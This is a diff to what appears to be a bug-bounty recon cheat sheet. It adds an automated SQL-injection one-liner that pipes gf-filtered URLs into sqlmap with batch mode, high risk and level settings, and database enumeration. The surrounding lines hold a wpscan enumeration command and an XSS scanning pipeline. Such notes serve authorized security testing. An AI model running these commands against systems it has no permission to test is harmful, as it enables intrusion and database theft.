@@ -50,7 +50,10 @@ wpscan --url target.com --disable-tls-checks -e at -e ap -e u --enumerate ap --p
 ```
 cat urls.txt| gf xss | Gxss -p Kapilxss | dalfox pipe
 ```
-
+### SQLi Automation
+```
+cat urls.txt | urldedupe | gf sqli > sql.urls && sqlmap -m sql.urls --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli.log
+```
 
 ## Tools used
 ```
@@ -68,5 +71,7 @@ dirsearch
 katana
 uro
 wpscan
-
+Gxss
+urldedupe
+dalfox
 ```
